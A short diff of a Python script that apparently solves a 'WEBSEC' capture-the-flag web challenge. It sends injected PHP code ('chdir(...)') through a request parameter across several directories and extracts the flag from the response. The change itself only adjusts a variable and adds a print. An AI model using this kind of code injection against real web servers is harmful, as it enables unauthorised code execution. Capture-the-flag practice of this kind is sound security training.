@@ -21,7 +21,7 @@ dic = ['./bin' ,
         './tmp' , 
         './usr' , 
         './var']
-available_file = './tmp'
+available_file = ''
 for file in dic :
     params = {
         'c' : "chdir('{0}');".format(file),
@@ -49,5 +49,6 @@ pos = r.text.find('WEBSEC{')
 while(True):
     print(r.text[pos] , end='')
     if (r.text[pos] == '}'):
+        print()
         break
     pos += 1
